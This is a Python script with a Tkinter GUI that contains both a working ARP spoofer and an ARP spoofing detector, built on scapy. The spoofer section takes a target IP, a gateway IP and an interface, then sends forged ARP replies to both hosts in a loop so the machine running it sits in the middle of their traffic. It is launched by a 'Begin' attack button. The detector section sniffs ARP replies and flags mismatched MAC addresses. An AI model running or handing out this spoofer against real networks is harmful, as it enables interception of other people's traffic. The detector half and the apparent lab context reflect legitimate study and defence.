#!/usr/bin/python3
import scapy.all as scapy
from tkinter import *
import paramiko, sys, os, threading, signal, time, functools
from concurrent import futures
 
thread_pool_executor = futures.ThreadPoolExecutor(max_workers=1)

def tk_after(target):
 
    @functools.wraps(target)
    def wrapper(self, *args, **kwargs):
        args = (self,) + args
        frame.after(0, target, *args, **kwargs)
 
    return wrapper

def submit_to_pool_executor(executor):
    '''Decorates a method to be sumbited to the passed in executor'''
    def decorator(target):
 
        @functools.wraps(target)
        def wrapper(*args, **kwargs):
            result = executor.submit(target, *args, **kwargs)
            result.add_done_callback(executor_done_call_back)
            return result
 
        return wrapper
 
    return decorator

def executor_done_call_back(future):
    exception = future.exception()
    if exception:
        raise exception

stop_flag = False
count = 0
message = ""
interface = ""


frame = Tk()

frame.title("Arp Spoofing / Detector")
frame.geometry('600x450')


attacklbl = Label(frame, text='ARP Spoofer')
attacklbl.grid(column=1, row=1)
targetlbl = Label(frame, text='Enter the target machine\'s IP: ')
targetlbl.grid(column=0, row=2)
targettxt = Entry(frame, width=20)
targettxt.grid(column=1, row=2)

gatewaylbl = Label(frame, text='Enter the IP we\'ll spoof: ')
gatewaylbl.grid(column=0, row=4)
gatewaytxt = Entry(frame, width=20)
gatewaytxt.grid(column=1, row=4)

networklbl = Label(frame, text='Enter the network interface: ')
networklbl.grid(column=0, row=6)
networktxt = Entry(frame, width=20)
networktxt.grid(column=1, row=6)

output = Text(frame, wrap=WORD, width=30, height=3)
output.grid(column=0, row=10)

target_ip = ""#"192.168.56.117" # Enter your target IP
gateway_ip = ""#"192.168.56.100" # Enter your gateway's IP

def get_mac(ip):
        global interface
        interface = networktxt.get()
        arp_request = scapy.ARP(pdst = ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False, iface = interface, inter = 0.1)[0]
        return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
	scapy.send(packet, verbose = False)


def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
	scapy.send(packet, verbose = False)

def clicked():
    global message
    try:
	    target_ip = targettxt.get()
	    gateway_ip = gatewaytxt.get()
	    sent_packets_count = 0
	    while stop_flag:
	        spoof(target_ip, gateway_ip)
	        spoof(gateway_ip, target_ip)
	        sent_packets_count = sent_packets_count + 2
	        message = "\r[*] Packets Sent "+str(sent_packets_count)+"\n"
	        output.delete("2.0", END)
	        output.insert(END, "\n"+message)
	        output.update()
	        time.sleep(2) # Waits for two seconds

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")

submit = Button(frame, text='Place holder')

@tk_after
def set_button_text(new_text=''):
    submit.configure(text = new_text)
 
@tk_after
def set_button_state(enable=True):
    new_state = 'normal' if enable else 'disable'
    submit.configure(state = new_state)

def on_button():
    global stop_flag
    if not stop_flag:
        stop_flag = True
        begin_attack()
        set_button_text('Stop Attack')
    else:
        stop_flag = False
        set_button_state(False)
        set_button_text('Stopping')
        stop_attack()

@submit_to_pool_executor(thread_pool_executor)
def stop_attack():
    set_button_state(True)
    set_button_text('Begin')
    output.delete("1.0", END)
    output.insert(END, "Attack Stopped")
    output.update()

@submit_to_pool_executor(thread_pool_executor)
def begin_attack():
    global stop_flag
    try:
        output.delete("1.0", END)
        output.insert(END, "Attack Started")
        output.update()
        clicked()
    except KeyboardInterrupt:
        stop_flag = False


submit = Button(frame, text='Begin', command=on_button)
submit.grid(column=2, row=8)

detectmessage = ""
detect_stop_flag = False
detectcount = 0

attacklbl = Label(frame, text='ARP Detecter')
attacklbl.grid(column=1, row=11)
detectlbl = Label(frame, text='Enter the network interface: ')
detectlbl.grid(column=0, row=12)
detecttxt = Entry(frame, width=20)
detecttxt.grid(column=1, row=12)

outputdetect = Text(frame, wrap=WORD, width=30, height=10)
outputdetect.grid(column=0, row=16)

def mac_detect(ipadd):
	global detecttxt
	arp_request = scapy.ARP(pdst=ipadd)
	br = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
	arp_req_br = br / arp_request
	answered = scapy.srp(arp_req_br, timeout = 2, verbose = False, iface = detecttxt.get(), inter = 0.1)[0]
	#print(answered)
	return answered[0][1].hwsrc

def sniff_detect(interface):
	scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet_detect, stop_filter=stopfilter)

def process_sniffed_packet_detect(packet):
	global detectmessage, detectcount
	if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2:
		#print(packet[scapy.ARP].psrc, packet[scapy.ARP].hwsrc)
		try: 
			originalmac = mac_detect(packet[scapy.ARP].psrc)
			responsemac = packet[scapy.ARP].hwsrc
			if originalmac != responsemac:
				detectcount+=1
				detectmessage = (f"[{detectcount} detected] ALERT!! You are under attack, ARP Table is being poisoned! Real-MAC: {originalmac.upper()}, Fake-MAC: {responsemac.upper()} [*]")
				#print(f"[*] ALERT!! You are under attack, ARP Table is being poisoned! Real-MAC: {originalmac.upper()}, Fake-MAC: {responsemac.upper()} [*]")
				outputdetect.delete("2.0", END)
				outputdetect.insert(END, "\n"+detectmessage)
				outputdetect.update()
		except IndexError:
			pass

def stopfilter(x):
    global detect_stop_flag
    return not detect_stop_flag

def clicked_detect():
    global detecttxt
    sniff_detect(detecttxt.get())

submitdetect = Button(frame, text='Place holder')

@tk_after
def set_detect_button_text(new_text=''):
    submitdetect.configure(text = new_text)
 
@tk_after
def set_detect_button_state(enable=True):
    new_state = 'normal' if enable else 'disable'
    submitdetect.configure(state = new_state)

def on_detect_button():
    global detect_stop_flag
    if not detect_stop_flag:
        detect_stop_flag = True
        begin_detect()
        set_detect_button_text('Stop Detection')
    else:
        detect_stop_flag = False
        set_detect_button_state(False)
        set_detect_button_text('Stopping')
        stop_detect()

@submit_to_pool_executor(thread_pool_executor)
def stop_detect():
    global detectcount
    detectcount = 0
    set_detect_button_state(True)
    set_detect_button_text('Begin')
    outputdetect.delete("1.0", END)
    outputdetect.insert(END, "ARP Detection Stopped")
    outputdetect.update()

@submit_to_pool_executor(thread_pool_executor)
def begin_detect():
    global detect_stop_flag
    try:
        outputdetect.delete("1.0", END)
        outputdetect.insert(END, "ARP Detection Started")
        outputdetect.update()
        clicked_detect()
    except KeyboardInterrupt:
        detect_stop_flag = False

submitdetect = Button(frame, text='Begin', command=on_detect_button)
submitdetect.grid(column=2, row=14)

frame.mainloop()
